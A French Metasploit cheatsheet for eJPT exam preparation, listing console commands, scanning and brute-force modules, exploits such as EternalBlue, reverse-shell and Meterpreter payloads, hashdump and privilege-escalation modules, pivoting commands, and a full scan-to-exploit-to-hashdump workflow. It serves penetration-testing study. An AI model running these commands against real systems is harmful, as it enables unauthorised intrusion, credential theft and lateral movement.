# 🎯 Metasploit Framework - Cheatsheet complète eJPT

## 🚀 1. Commandes de base

### Démarrage et configuration
| Commande | Description |
|----------|-------------|
| `msfconsole` | Démarrer Metasploit |
| `msfconsole -q` | Démarrage silencieux (sans banner) |
| `exit` ou `quit` | Quitter Metasploit |
| `help` | Aide générale |
| `version` | Version de Metasploit |
| `banner` | Afficher le banner |

### Gestion de la base de données
| Commande | Description |
|----------|-------------|
| `db_status` | Statut de la base de données |
| `db_connect` | Connexion à la base |
| `db_disconnect` | Déconnexion de la base |
| `db_rebuild_cache` | Reconstruire le cache |
| `db_nmap` | Lancer nmap et sauver en base |

---

## 🏢 2. Gestion des workspaces

### Workspace management
| Commande | Description |
|----------|-------------|
| `workspace` | Lister les workspaces |
| `workspace -a ejpt` | Créer un workspace "ejpt" |
| `workspace ejpt` | Utiliser le workspace "ejpt" |
| `workspace -d ejpt` | Supprimer le workspace "ejpt" |
| `workspace -r old new` | Renommer un workspace |

---

## 🔍 3. Recherche de modules

### Commandes de recherche
| Commande | Description |
|----------|-------------|
| `search <terme>` | Recherche générale |
| `search type:exploit` | Recherche d'exploits uniquement |
| `search type:auxiliary` | Recherche de modules auxiliaires |
| `search type:post` | Modules post-exploitation |
| `search platform:windows` | Modules pour Windows |
| `search platform:linux` | Modules pour Linux |
| `search cve:2017` | Recherche par CVE |
| `search name:eternal` | Recherche par nom |
| `search app:apache` | Recherche par application |

### Recherches spécialisées
| Commande | Description |
|----------|-------------|
| `search smb` | Modules liés à SMB |
| `search http scanner` | Scanners HTTP |
| `search ftp login` | Modules de login FTP |
| `search ssh enum` | Énumération SSH |
| `search mysql` | Modules MySQL |

---

## 🛠️ 4. Utilisation des modules

### Gestion des modules
| Commande | Description |
|----------|-------------|
| `use <module>` | Utiliser un module |
| `back` | Retourner au prompt principal |
| `info` | Informations sur le module actuel |
| `show options` | Afficher les options du module |
| `show advanced` | Options avancées |
| `show targets` | Cibles disponibles (exploits) |
| `show payloads` | Payloads compatibles |

### Configuration des modules
| Commande | Description |
|----------|-------------|
| `set <option> <value>` | Définir une option |
| `setg <option> <value>` | Définir une option globale |
| `unset <option>` | Supprimer une option |
| `unsetg <option>` | Supprimer une option globale |
| `show missing` | Options obligatoires manquantes |

### Exécution
| Commande | Description |
|----------|-------------|
| `run` | Exécuter le module |
| `exploit` | Exécuter l'exploit |
| `check` | Vérifier si la cible est vulnérable |
| `rcheck` | Check distant (reverse) |

---

## 🔎 5. Modules de scanning essentiels

### Découverte d'hôtes
| Module | Description |
|--------|-------------|
| `auxiliary/scanner/discovery/arp_sweep` | Scan ARP du réseau local |
| `auxiliary/scanner/discovery/ping_sweep` | Ping sweep |
| `auxiliary/scanner/discovery/udp_sweep` | Découverte UDP |
| `auxiliary/scanner/netbios/nbname` | Énumération NetBIOS |

### Scan de ports
| Module | Description |
|--------|-------------|
| `auxiliary/scanner/portscan/syn` | Scan SYN TCP |
| `auxiliary/scanner/portscan/tcp` | Scan TCP connect |
| `auxiliary/scanner/portscan/ack` | Scan ACK |
| `auxiliary/scanner/portscan/xmas` | Scan Christmas tree |
| `auxiliary/scanner/portscan/ftpbounce` | FTP bounce scan |

---

## 🌐 6. Énumération par service

### SMB (139, 445)
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/smb/smb_version` | Version SMB | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/smb/smb_enumshares` | Énumération des partages | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/smb/smb_enumusers` | Énumération des utilisateurs | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/smb/smb_login` | Brute force SMB | `set RHOSTS x.x.x.x; set USER_FILE users.txt; set PASS_FILE pass.txt; run` |
| `auxiliary/scanner/smb/smb_lookupsid` | Énumération SID | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/smb/smb_ms17_010` | Check EternalBlue | `set RHOSTS x.x.x.x; run` |

### HTTP/HTTPS (80, 443)
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/http/http_version` | Version du serveur web | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/http/dir_scanner` | Énumération de répertoires | `set RHOSTS x.x.x.x; set DICTIONARY /path/to/wordlist; run` |
| `auxiliary/scanner/http/files_dir` | Fichiers et répertoires | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/http/http_header` | Headers HTTP | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/http/robots_txt` | Fichier robots.txt | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/http/ssl_version` | Version SSL/TLS | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/http/wordpress_scanner` | Scan WordPress | `set RHOSTS x.x.x.x; run` |

### FTP (21)
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/ftp/ftp_version` | Version FTP | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/ftp/anonymous` | Login anonyme FTP | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/ftp/ftp_login` | Brute force FTP | `set RHOSTS x.x.x.x; set USERNAME admin; set PASS_FILE pass.txt; run` |

### SSH (22)
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/ssh/ssh_version` | Version SSH | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/ssh/ssh_login` | Brute force SSH | `set RHOSTS x.x.x.x; set USERNAME root; set PASS_FILE pass.txt; run` |
| `auxiliary/scanner/ssh/ssh_enumusers` | Énumération d'utilisateurs SSH | `set RHOSTS x.x.x.x; set USER_FILE users.txt; run` |
| `auxiliary/scanner/ssh/ssh_login_pubkey` | Login avec clé publique | `set RHOSTS x.x.x.x; set USERNAME user; set KEY_PATH /path/to/key; run` |

### MySQL (3306)
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/mysql/mysql_version` | Version MySQL | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/mysql/mysql_login` | Brute force MySQL | `set RHOSTS x.x.x.x; set USERNAME root; set PASS_FILE pass.txt; run` |
| `auxiliary/admin/mysql/mysql_sql` | Exécution SQL | `set RHOSTS x.x.x.x; set USERNAME root; set PASSWORD pass; set SQL "SHOW DATABASES"; run` |
| `auxiliary/scanner/mysql/mysql_schemadump` | Dump du schéma | `set RHOSTS x.x.x.x; set USERNAME root; set PASSWORD pass; run` |

### SMTP (25, 587)
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/smtp/smtp_version` | Version SMTP | `set RHOSTS x.x.x.x; run` |
| `auxiliary/scanner/smtp/smtp_enum` | Énumération SMTP | `set RHOSTS x.x.x.x; set USER_FILE users.txt; run` |
| `auxiliary/scanner/smtp/smtp_relay` | Test de relay SMTP | `set RHOSTS x.x.x.x; run` |

---

## ⚔️ 7. Modules d'exploitation essentiels

### Windows SMB Exploits
| Module | CVE | Cible | Usage |
|--------|-----|-------|-------|
| `exploit/windows/smb/ms17_010_eternalblue` | CVE-2017-0144 | Win 7/8/10/2008/2012/2016 | `set RHOSTS x.x.x.x; set LHOST y.y.y.y; exploit` |
| `exploit/windows/smb/ms08_067_netapi` | CVE-2008-4250 | Win XP/2003/Vista/2008 | `set RHOSTS x.x.x.x; set LHOST y.y.y.y; exploit` |
| `exploit/windows/smb/ms09_050_smb2_negotiate_func_index` | CVE-2009-3103 | Win Vista/7/2008 | `set RHOSTS x.x.x.x; set LHOST y.y.y.y; exploit` |

### Linux Exploits
| Module | CVE | Description | Usage |
|--------|-----|-------------|-------|
| `exploit/multi/samba/usermap_script` | CVE-2007-2447 | Samba 3.0.20 < 3.0.25rc3 | `set RHOSTS x.x.x.x; set LHOST y.y.y.y; exploit` |
| `exploit/linux/samba/is_known_pipename` | CVE-2017-7494 | Samba 3.5.0 < 4.6.4 | `set RHOSTS x.x.x.x; set LHOST y.y.y.y; exploit` |

### Web Application Exploits
| Module | Description | Usage |
|--------|-------------|-------|
| `exploit/multi/http/struts2_content_type_ognl` | Apache Struts2 OGNL | `set RHOSTS x.x.x.x; set LHOST y.y.y.y; exploit` |
| `exploit/windows/http/rejetto_hfs_exec` | Rejetto HFS Remote Command Execution | `set RHOSTS x.x.x.x; set LHOST y.y.y.y; exploit` |

---

## 🎯 8. Gestion des payloads

### Types de payloads principaux
| Type | Description |
|------|-------------|
| `windows/shell/reverse_tcp` | Shell Windows reverse TCP |
| `windows/shell/bind_tcp` | Shell Windows bind TCP |
| `windows/meterpreter/reverse_tcp` | Meterpreter Windows reverse |
| `linux/x86/shell/reverse_tcp` | Shell Linux reverse TCP |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter Linux reverse |

### Configuration des payloads
| Commande | Description |
|----------|-------------|
| `set payload <payload>` | Définir le payload |
| `show payloads` | Payloads compatibles |
| `set LHOST <ip>` | IP d'écoute (attaquant) |
| `set LPORT <port>` | Port d'écoute |
| `generate` | Générer le payload |

---

## 🖥️ 9. Gestion des sessions

### Commandes de session
| Commande | Description |
|----------|-------------|
| `sessions` | Lister les sessions actives |
| `sessions -l` | Liste détaillée des sessions |
| `sessions -i <id>` | Interagir avec une session |
| `sessions -k <id>` | Tuer une session |
| `sessions -K` | Tuer toutes les sessions |
| `sessions -u <id>` | Upgrader vers Meterpreter |

### Background et foreground
| Commande | Description |
|----------|-------------|
| `background` | Mettre en arrière-plan |
| `bg` | Raccourci pour background |
| `sessions -i <id>` | Revenir à une session |

---

## 🔧 10. Meterpreter - Commandes essentielles

### Navigation système
| Commande | Description |
|----------|-------------|
| `sysinfo` | Informations système |
| `getuid` | Utilisateur actuel |
| `pwd` | Répertoire actuel |
| `ls` | Lister le contenu |
| `cd <path>` | Changer de répertoire |
| `cat <file>` | Afficher un fichier |

### Gestion des processus
| Commande | Description |
|----------|-------------|
| `ps` | Lister les processus |
| `migrate <pid>` | Migrer vers un processus |
| `kill <pid>` | Tuer un processus |
| `getpid` | PID actuel |

### Système de fichiers
| Commande | Description |
|----------|-------------|
| `download <remote> <local>` | Télécharger un fichier |
| `upload <local> <remote>` | Uploader un fichier |
| `search -f <filename>` | Rechercher un fichier |
| `edit <file>` | Éditer un fichier |

### Réseau et pivoting
| Commande | Description |
|----------|-------------|
| `ipconfig` | Configuration IP |
| `route` | Table de routage |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Port forwarding |
| `run autoroute -s <subnet>` | Ajouter une route |

---

## 🚀 11. Modules post-exploitation

### Reconnaissance Windows
| Module | Description |
|--------|-------------|
| `post/windows/gather/enum_logged_on_users` | Utilisateurs connectés |
| `post/windows/gather/credentials/windows_autologin` | Credentials AutoLogon |
| `post/windows/gather/hashdump` | Dump des hashes |
| `post/windows/gather/smart_hashdump` | Dump intelligent |
| `post/windows/gather/enum_shares` | Partages réseau |
| `post/windows/gather/enum_applications` | Applications installées |

### Reconnaissance Linux
| Module | Description |
|--------|-------------|
| `post/linux/gather/enum_configs` | Configurations système |
| `post/linux/gather/enum_network` | Configuration réseau |
| `post/linux/gather/enum_system` | Informations système |
| `post/linux/gather/hashdump` | Dump /etc/shadow |

### Privilege Escalation
| Module | Description |
|--------|-------------|
| `post/multi/recon/local_exploit_suggester` | Suggestion d'exploits locaux |
| `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` | Windows privilege escalation |
| `exploit/linux/local/cve_2016_5195_dirtycow` | Linux Dirty COW |

---

## 🎪 12. Modules auxiliaires utiles

### Administration
| Module | Description |
|--------|-------------|
| `auxiliary/admin/smb/psexec_command` | Exécution de commandes via PsExec |
| `auxiliary/admin/mysql/mysql_sql` | Exécution SQL MySQL |
| `auxiliary/admin/http/tomcat_administration` | Administration Tomcat |

### Gathering
| Module | Description |
|--------|-------------|
| `auxiliary/gather/enum_dns` | Énumération DNS |
| `auxiliary/gather/search_email_collector` | Collecte d'emails |

---

## 📊 13. Base de données et reporting

### Gestion des hôtes
| Commande | Description |
|----------|-------------|
| `hosts` | Lister les hôtes |
| `hosts -a <ip>` | Ajouter un hôte |
| `hosts -d <ip>` | Supprimer un hôte |
| `hosts -o <file>` | Exporter les hôtes |

### Gestion des services
| Commande | Description |
|----------|-------------|
| `services` | Lister les services |
| `services -p <port>` | Services sur un port |
| `services -s <service>` | Services spécifiques |

### Vulnérabilités
| Commande | Description |
|----------|-------------|
| `vulns` | Lister les vulnérabilités |
| `vulns -p <port>` | Vulnérabilités sur un port |

### Export et reporting
| Commande | Description |
|----------|-------------|
| `db_export -f xml output.xml` | Export XML |
| `db_export -f csv output.csv` | Export CSV |

---

## 🔧 14. Configuration et personnalisation

### Variables globales utiles
| Variable | Description | Exemple |
|----------|-------------|---------|
| `RHOSTS` | Hôtes cibles | `setg RHOSTS 192.168.1.0/24` |
| `LHOST` | IP locale | `setg LHOST 192.168.1.100` |
| `LPORT` | Port local | `setg LPORT 4444` |

### Ressources (.rc files)
| Commande | Description |
|----------|-------------|
| `resource <file.rc>` | Exécuter un script .rc |
| `makerc <file.rc>` | Sauvegarder l'historique |

---

## 💡 15. Workflow eJPT avec Metasploit

### Phase 1: Reconnaissance
```bash
# Démarrage
msfconsole -q
workspace -a ejpt_target
setg RHOSTS 192.168.1.0/24

# Découverte d'hôtes
use auxiliary/scanner/discovery/ping_sweep
run

# Scan de ports
db_nmap -sV -sC 192.168.1.100
```

### Phase 2: Énumération
```bash
# SMB
use auxiliary/scanner/smb/smb_version
run
use auxiliary/scanner/smb/smb_enumshares
run

# HTTP
use auxiliary/scanner/http/http_version
run
use auxiliary/scanner/http/dir_scanner
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

### Phase 3: Exploitation
```bash
# Check EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
run

# Exploit si vulnérable
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit
```

### Phase 4: Post-exploitation
```bash
# Dans la session Meterpreter
sysinfo
getuid
hashdump

# Ou utiliser des modules post
background
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```

---

## 🎯 16. Conseils spécifiques eJPT

### Modules prioritaires à connaître
1. **Scanner SMB** : `smb_version`, `smb_enumshares`, `smb_ms17_010`
2. **Scanner HTTP** : `http_version`, `dir_scanner`
3. **Exploits SMB** : `ms17_010_eternalblue`, `ms08_067_netapi`
4. **Post-exploitation** : `local_exploit_suggester`, `hashdump`

### Raccourcis utiles
```bash
# Setup rapide
workspace -a ejpt && setg RHOSTS target_ip && setg LHOST attacker_ip

# Scan complet
db_nmap -sV -sC -O target && search type:exploit platform:windows

# Quick SMB check
use auxiliary/scanner/smb/smb_version && run && use auxiliary/scanner/smb/smb_ms17_010 && run
```

### Points d'attention
- **Toujours utiliser la base de données** : `db_nmap` vs `nmap`
- **Workspaces séparés** pour chaque cible
- **Sessions background** pour utiliser des modules post
- **Local exploit suggester** pour l'escalation de privilèges
- **Documentation** avec `hosts`, `services`, `vulns`

**🎯 Conseil final** : Metasploit est l'outil central de l'eJPT. Maîtriser ces modules et workflows te donnera un avantage énorme pendant l'examen !